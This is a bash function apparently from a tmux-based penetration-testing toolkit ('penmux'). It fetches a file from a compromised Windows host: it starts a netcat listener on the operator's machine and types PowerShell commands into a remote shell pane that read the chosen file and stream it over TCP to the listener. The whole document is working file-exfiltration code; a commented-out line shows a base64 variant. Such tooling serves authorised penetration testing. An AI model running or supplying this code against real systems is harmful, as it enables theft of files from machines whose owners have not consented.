#!/usr/bin/env bash


commander_run() {
  local pane_id="$1"
  local file_to_fetch="$(tmux command-prompt -p "Enter file to fetch: " "display-message -p '%%'")"
  local dst_file="###SessionDir###Files/${file_to_fetch}"
  dst_file="$(penmux_module_expand_options_string "$_MODULE_PATH" "$dst_file" "$pane_id")"
  dst_file="$(penmux_expand_tmux_format_path "$pane_id" "$dst_file")"
  local dst_dir="$(dirname "$dst_file")"
  local lhost="$(penmux_module_get_option "$_MODULE_PATH" "LocalHost" "$pane_id")"
  local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
  local listener_id

  if [[ ! -d "$dst_dir" ]]; then
    mkdir -p "$dst_dir" || return
  fi

  # listener_id="$(tmux new-window -P -d "nc -w 10 -nlvp \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\"")"
  tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst_file\""

  tmux send-keys '[byte[]]$buffer = New-Object byte[] 1024' Enter
  tmux send-keys "\$FileStream = [System.IO.File]::OpenRead(\"$file_to_fetch\")" Enter
  tmux send-keys "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
  tmux send-keys '$Stream = $TcpClient.GetStream()' Enter
  tmux send-keys 'while ( $bytes = $FileStream.Read($buffer,0,$buffer.count)) { $Stream.Write($buffer,0,$bytes) }' Enter
  tmux send-keys '$FileStream.Close()' Enter
  tmux send-keys '$Stream.Dispose()' Enter
  tmux send-keys '$TcpClient.Dispose()' Enter
}
